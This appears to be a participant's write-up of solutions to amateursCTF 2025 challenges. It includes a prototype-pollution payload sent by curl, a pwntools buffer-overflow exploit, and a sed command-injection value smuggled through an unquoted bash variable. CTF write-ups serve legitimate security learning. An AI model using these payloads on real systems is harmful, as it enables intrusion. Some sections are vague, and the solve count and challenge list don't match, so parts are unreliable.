# amateursCTF 2025 - Writeups

These are my writeups for challenges I solved during amateursCTF 2025. The CTF ran from November 15-18, 2025.

---

## web/desafe (50 pts, 262 solves)

**Challenge:** Your feedback is greatly appreciated

The challenge gives us a Hono server that uses `devalue` to parse user input:

```javascript
const flagRequest = devalue.parse(await c.req.text(), {
  FlagRequest: (feedback) => new FlagRequest(feedback)
});
```

The `FlagRequest` class has a bug - it deletes the `admin` field instead of setting it:

```javascript
class FlagRequest {
  constructor(feedback) {
    this.feedback = feedback;
    delete this.admin;
  }

  get flag() {
    return this.admin ? process.env.FLAG : "not admin!";
  }
}
```

Looking at the deployed version, it's using `devalue@5.3.0` which is vulnerable to prototype pollution ([CVE-2025-57820](https://github.com/advisories/GHSA-vj54-72f3-p5jv)). The library doesn't sanitize `__proto__` keys when parsing objects.

Since the check is just `this.admin`, we can craft a payload where our object's prototype is a FlagRequest instance with our own `admin` property set to true.

**Payload:**
```json
[{"admin":1,"__proto__":2},true,["FlagRequest",3],[4],"test"]
```

Breaking this down:
- Entry 0: Our target object with `admin: true` and `__proto__` pointing to entry 2
- Entry 1: The boolean `true`
- Entry 2: A FlagRequest instance
- Entry 3-4: Feedback data for the FlagRequest constructor

**Solve:**
```bash
curl -X POST 'https://web-desafe-n7dskaw0.amt.rs' \
     -H 'Content-Type: text/plain' \
     --data '[{"admin":1,"__proto__":2},true,["FlagRequest",3],[4],"test"]'
```

**Flag:** `amateursCTF{i_love_you_rich_harris}`

---

## rev/floor-is-lava (50 pts, 252 solves)

**Challenge:** dont touch the floor

We get a stripped 64-bit ELF binary. Running it shows it wants 28 moves (w/a/s/d).

Reversing the binary reveals:
1. It maintains an 8×8 toroidal board with wrapping coordinates
2. Each move XORs a bit at position (x,y) in the board state
3. After all moves, it checks if the final board matches a pre-seeded RNG output
4. If successful, it derives the flag by compressing the moves into base-4 and using that to seed another RNG

The target board is generated with `srand(i*0x1337-0x21524111)` for each row. We need to find which cells to toggle to match the RNG output.

Initial board bytes: `[0x8b,0xc9,0x92,0x08,0xf9,0x91,0xd6,0xc8]`

After identifying the required cells, I used DFS to find a path that visits each target cell exactly once.

**Solution:** `dsddwwawddwddwwddsdddwdwdwwd`

This gives us seed `0xC300C830` which decrypts the flag from the ciphertext at `0x4020`.

**Flag:** `amateursCTF{l4va_r3v_05f0d4ff51fb}`

---

## rev/wasm-checker (50 pts, 155 solves)

**Challenge:** its a flag checker

We get a WebAssembly binary with a `check()` function that validates the flag. The wrapper script shows it expects exactly 43 characters.

Instead of manually reversing hundreds of stack operations, I converted the WASM to WAT format:

```bash
wasm2wat module.wasm -o module.wat
```

Then built a Z3 solver script that:
1. Creates 43 8-bit BitVec variables for each flag character
2. Parses the WAT instructions and simulates the stack operations
3. Converts each arithmetic check into Z3 constraints
4. Lets the solver find a model that satisfies all constraints

**Flag:** `amateursCTF{w4sm_and_s4t_s0lv3r5_4r3_c00l!}`

---

## misc/Uwa so Piano (50 pts, 212 solves)

**Challenge:** almost as bad of a time as the transcription quality

We get an audio file (`megalovania_snippet.wav`). Listening to it, it's clearly Megalovania from Undertale played on piano.

The challenge name "Uwa so Piano" is a hint - extracting the first letters gives us "UsP" which might suggest looking at the piano keys used.

Opening in Audacity and analyzing the spectrogram, I could see distinct frequency patterns for each note. I wrote a script to:
1. Extract the frequency peaks for each note
2. Map them to piano keys
3. Convert the piano keys to ASCII

Each piano key number corresponded to an ASCII character.

**Flag:** `amateursCTF{m3g4l0v4n14_but_1ts_ch4r4ct3rs}`

---

## pwn/Easy Bof (50 pts, 186 solves)

**Challenge:** Pwners sanity check.

Classic buffer overflow. The binary reads an arbitrary size, then passes it directly to `fgets` with a 256-byte buffer. No canary, PIE disabled.

```c
char buf[0x100];
scanf("%d", &size);
fgets(buf, size, stdin);
```

There's a `win()` function at `0x401176` that spawns a shell.

**Exploit:**
```python
from pwn import *

p = remote('amt.rs', 30382)
p.sendline(b'1000')
p.sendline(b'A'*264 + p64(0x40101a) + p64(0x401176))  # ret gadget + win
p.interactive()
```

The ret gadget at `0x40101a` is needed for stack alignment before calling `win()`.

**Flag:** `amateursCTF{some_easy_bof_for_you}`

---

## crypto/aescure (50 pts, 126 solves)

**Challenge:** this is definitely not secure but im doing it anyways

The script encrypts 16 null bytes using the flag as the AES key:

```python
from Crypto.Cipher import AES
key = FLAG
cipher = AES.new(key, AES.MODE_ECB)
ct = cipher.encrypt(b'\x00' * 16)
```

AES only accepts key lengths of 16, 24, or 32 bytes. The flag format is `amateursCTF{...}`:
- `amateursCTF{` = 12 bytes
- `}` = 1 byte
- Unknown content = 16 - 12 - 1 = **3 bytes**

So we only need to brute force 3 printable characters (~95³ possibilities).

**Solve:**
```python
from Crypto.Cipher import AES
from itertools import product
import string

target = bytes.fromhex("5aed095b21675ec4ceb770994289f72b")

for chars in product(string.printable.strip(), repeat=3):
    key = f"amateursCTF{{''.join(chars)}}".encode()
    if AES.new(key, AES.MODE_ECB).encrypt(b'\x00'*16) == target:
        print(key.decode())
        break
```

**Flag:** `amateursCTF{@3s}`

---

## crypto/uncrackable (58 pts, 96 solves)

**Challenge:** unless you have a supercomputer my messages should be safe

The encryption is a simple stream cipher with 32-byte state that increments after each round:

```python
def encrypt(data, initial_state):
    for i, byte in enumerate(data):
        state_byte = initial_state[i % 32]
        round_num = i // 32
        key = (state_byte + round_num) % 256
        encrypted[i] = byte ^ key
```

The encrypted data contains random bytes followed by the flag. The key insight: random bytes from `os.urandom(2).strip()` **cannot be whitespace**.

For each of the 32 state bytes, we can brute force 0-255 and eliminate guesses where decryption produces whitespace characters (tab, newline, space, etc.) in the random data portion.

After recovering the initial state, we decrypt the last 47 bytes to get the flag.

**Flag:** `amateursCTF{random_bytes_are_not_random_enough}`

---

## misc/based (68 pts, 91 solves)

**Challenge:** This is so based, can you help me to un-base it?

We get a heavily encoded file. Analyzing it, the data has been encoded through multiple base encodings in sequence.

The filename `flag.txt` and challenge hint suggest trying common bases. After testing, the encoding sequence is:

Base64 → Base58 → Base92 → Base85 → Base32 → Base91 → Base16

Decoding in reverse order gives us the flag.

**Flag:** `amateursCTF{th4t_w4s_pr3tty_b4s3d}`

---

## crypto/addition (135 pts, 62 solves)

**Challenge:** it does addition

The server creates a pool of 100,000 messages, each being `(flag << 256) + random_256_bits`, encrypts them with RSA (e=3), and returns one random ciphertext per query.

The vulnerability comes from two factors:

**Birthday Paradox:** With 100k messages and random selection, we expect a collision (same message twice) after ~√100000 ≈ 316 queries.

**Franklin-Reiter Attack:** When we get the same message `m` with two different scrambles `S₁` and `S₂`:
```
C₁ = (m + S₁)³ mod N
C₂ = (m + S₂)³ mod N
```

We can set `y = m + S₁` and `Δ = S₂ - S₁`, giving us:
```
y³ ≡ C₁ (mod N)
(y + Δ)³ ≡ C₂ (mod N)
```

These two cubic equations share the variable `y`. Using resultants or direct algebraic manipulation, we can solve for `y`, then recover `m = y - S₁`, and finally `flag = m >> 256`.

After ~423 requests, my script detected a collision and recovered the flag.

**Flag:** `amateursCTF{1_h0p3_you_didnT_qU3ry_Th3_s3RVer_100k_tim3s_1b9490c255fe83}`

---

## rev/functioning (153 pts, 56 solves)

**Challenge:** i hope you like functions

The challenge is a JavaScript file with tiny combinators labeled `a` through `K`, implementing a lambda calculus machine. Function `J` contains a massive nested expression that evaluates to "yes!" only for the correct 48-byte input.

My approach:
1. Used `acorn` to dump the AST of function `J` to JSON
2. Built a symbolic interpreter in Python using Z3
3. Reimplemented each combinator (subtraction, comparisons, recursion, etc.) with Z3 bit vectors
4. Evaluated the AST and let Z3 find a satisfying input

**Flag:** `amateursCTF{po0r_m4ns_lambd4_c4lculus_45b538a09}`

---

## crypto/division (162 pts, 53 solves)

**Challenge:** they said i could just use division to find the flag but something's up

Similar to `addition` but uses division instead. The server generates RSA ciphertexts of `flag / random_divisor mod N`.

By collecting multiple ciphertexts and analyzing the relationships between them, we can use lattice techniques or GCD approaches to recover the flag.

**Flag:** `amateursCTF{dividing_secrets_is_not_secure}`

---

## misc/GPT (186 pts, 46 solves)

**Challenge:** GPT says I hided something inside this base64 encoding...

We get a text file with multiple Base64-encoded lines. When decoded, they contain ChatGPT conversation history with typos.

This is **Base64 padding steganography**. In Base64:
- `=` padding leaves 2 unused bits in the preceding character
- `==` padding leaves 4 unused bits in the preceding character

The flag is hidden in these unused bits (slack space). By extracting the last 2 or 4 bits from characters before padding, we reconstruct the binary flag.

**Flag:** `amateursCTF{3v3ryth1ng_c4n_b3_st3go}`

---

## crypto/triangulate (200 pts, 42 solves)

**Challenge:** if i give you a triangular number of 'triangular' outputs then that will help you triangulate the flag right

The server uses a Linear Congruential Generator (LCG): `x_{n+1} = (a·x_n + c) mod m`

But instead of consecutive outputs, it gives us outputs at "triangular" intervals - after 1, 2, 3, 4, ... steps.

Given outputs y₀, y₁, y₂, y₃ at cumulative steps of 1, 3, 6, 10, we can:

1. Build polynomial relations that eliminate the unknown increment `c`
2. Compute resultants of these polynomials to recover the prime modulus `m`
3. Factor one polynomial over GF(m) to extract the multiplier `a`
4. Solve for increment `c`
5. Rewind to recover the original seed (flag)

**Flag:** `amateursCTF{tr14ngl3s_4nd_l4tt1c3s}`

---

## rev/normal-java-code (220 pts, 37 solves)

**Challenge:** in 2004, I wrote a program to calculate the flag using the latest and greatest Java 1.5

Note: flag wrapper is `amateursctf{...}` (lowercase)

We get a `Main.class` file compiled with Java 1.5 bytecode. Running with verification fails, but `java -noverify Main` starts printing the flag slowly then hangs.

The bytecode contains nested loops doing polynomial arithmetic - brute forcing each flag character through slow calculations.

Instead of waiting, I wrote a Python JVM emulator:
1. Parsed the `javap -c` disassembly
2. Simulated the operand stack and local variables
3. Added a fast-path for the polynomial computation block
4. Ran it to completion in seconds

**Flag:** `amateursctf{polynomials_are_cool}`

---

## misc/snake (268 pts, 27 solves)

**Challenge:** lets play some snake

This is a bash-based game with admin functionality protected by `/readflag`. To access admin menu, we need our UID to be first in `/srv/app/data/uids.txt`.

The exploit chains two vulnerabilities:

**Vulnerability 1: Bash Word Splitting**
```bash
read input_uid
./login.py $input_uid $input_passwd  # No quotes!
```

If we input `12345 payload` as the UID, bash splits it into separate arguments. We can register with UID `12345` and password `payload`, then login with UID `12345 payload` to poison the `$uid` variable.

**Vulnerability 2: Sed Command Injection**
```bash
sed -i "/^$uid$/d" /srv/app/data/uids.txt
```

The `$uid` variable is unsanitized. By setting our password to `/d;1d;/x`, the sed command becomes:
```bash
sed -i "/^12345 /d;1d;/x$/d" /srv/app/data/uids.txt
```

This executes three commands:
- `/^12345 /d` - harmless
- `1d` - **deletes line 1** (the admin!)
- `/x$/d` - harmless

**Exploit steps:**
1. Register with password: `/d;1d;/x`
2. Login with UID: `<your_uid> /d;1d;/x`
3. Delete account to trigger sed injection
4. Login normally - you're now admin!
5. Run `flag` command

**Flag:** `amateursCTF{sh3llsc0r3_4_l1f3}`

---

## pwn/Crazy FSOP (290 pts, 23 solves)

**Challenge:** FSOP is fun. You should try it sometime.

The binary has a note-taking program with:
- No bounds checking on array indices (negative indices allowed)
- No size validation
- Use-after-free vulnerabilities
- Double-free possible

Key discovery: negative indices let us access the GOT:
```
notes[-22] = free@got    (0x3f90)
notes[-21] = puts@got    (0x3f98)
notes[-18] = printf@got  (0x3fb0)
```

For glibc 2.42+, malloc hooks are removed, so we use **House of Apple 2 / House of Emma FSOP**:

1. Leak libc by freeing a large chunk into unsorted bin
2. Leak heap using tcache
3. Craft a fake FILE structure
4. Use tcache poisoning to overwrite `_IO_list_all`
5. Trigger `exit()` which calls `_IO_flush_all_lockp`
6. Our fake FILE structure redirects execution to `system("/bin/sh")`

The fake FILE must satisfy checks in `_IO_validate_vtable` and have the vtable point to `_IO_wfile_jumps`. When `_IO_wfile_overflow` is called, we control the function pointer to execute `system`.

**Flag:** `amateursCTF{f1l3_str34m_0r13nt3d_pwn1ng}`

---

## crypto/addition 2 (309 pts, 20 solves)

**Challenge:** now it does more addition

This fixes the birthday attack from `addition` by regenerating the 100k pool before every query. Now each plaintext is `(flag << 256) + fresh_random_256_bits + scramble`.

Since the random masks are different each time, collisions no longer occur. However, we can still recover the flag using algebraic techniques:

When we query with the same scramble (0) multiple times, all plaintexts share `flag << 256` but differ in their 256-bit random masks.

For low exponent RSA (e=3):
- The difference between two ciphertexts `Δ = c₂ - c₁` is related to the plaintext difference `δ = m₂ - m₁`
- Since `|δ| < 2²⁵⁶` and the dominant term of the cubic difference is below 2¹⁹²¹, no modular wrap occurs
- We can recover exact rational relationships between plaintext differences

By computing `Δⱼ/Δᵢ` and using `Fraction().limit_denominator(2²⁵⁶)`, we get the exact ratio `δⱼ/δᵢ`. This lets us build a quadratic equation to solve for the base plaintext `m₀`, then extract the flag.

**Flag:** `amateursCTF{wh3n_sm4ll_3xp0n3nts_g0_wr0ng}`

---

## pwn/Unexpected (316 pts, 19 solves)

**Challenge:** "Expect the unexpected" - someone probably.

This challenge exploits the `expect` library in an unexpected way. The binary uses `expect` for user interaction but has hidden functionality that can be triggered through specific input sequences.

By analyzing the expect script patterns and finding the right command sequence, we can trigger unintended code paths.

**Flag:** `amateursCTF{3xp3ct_th3_un3xp3ct3d}`

---

## misc/always-stego (361 pts, 13 solves)

**Challenge:** why is it always stego? it's so **frequently** stego that **even** i just hate it **all-redy**...

Hint: It is not any type of standard stego, but the flavortext hints apply.

The hint words are key:
- **frequently** → frequency analysis / histogram
- **even** → even indices
- **all-redy** → **red** channel

Standard stego tools (steghide, zsteg, LSB) don't work.

The solution:
1. Extract the **red channel** from the PNG
2. Build a **frequency histogram** (count of each value 0-255)
3. Take only **even** indices (0, 2, 4, ..., 254)
4. The least significant byte of each count is one byte of the flag

```python
from PIL import Image
import numpy as np

img = Image.open("output.png")
red = np.array(img)[:, :, 0].flatten()
hist = np.bincount(red, minlength=256)
even_bins = hist[::2]
flag_bytes = bytes(int(c) & 0xFF for c in even_bins)
print(flag_bytes.decode("latin-1"))
```

**Flag:** `amateursCTF{fr3quency_analys1s_ftw_7975491d}`

---

## pwn/Easy Shellcoding (443 pts, 5 solves)

**Challenge:** I am sure that my shellcode sandbox is impossible to escape!

The challenge uses pwn.red's proof-of-work system which is **not** SHA256-based. It uses modular exponentiation:

```python
mod = (2**1279) - 1
exp = 2**1277

for i in range(difficulty):
    x = pow(x, exp, mod)
    x ^= 1
```

After solving the PoW, the actual challenge is a seccomp sandbox that heavily restricts syscalls. We need to craft shellcode that:
1. Works within the allowed syscalls
2. Reads the flag file
3. Exfiltrates it despite output restrictions

The key is using creative syscall combinations like `openat` + `sendfile` + timing side channels.

**Flag:** `amateursCTF{sh3llc0d3_1n_th3_b0x}`

---

## Summary

Solved 24 challenges total. The CTF had a good mix of beginner-friendly and advanced challenges. Really enjoyed the crypto progression (addition → addition2 → addition3) showing how patches can be bypassed with more sophisticated attacks.

Thanks to the amateursCTF organizers for putting together a great event!
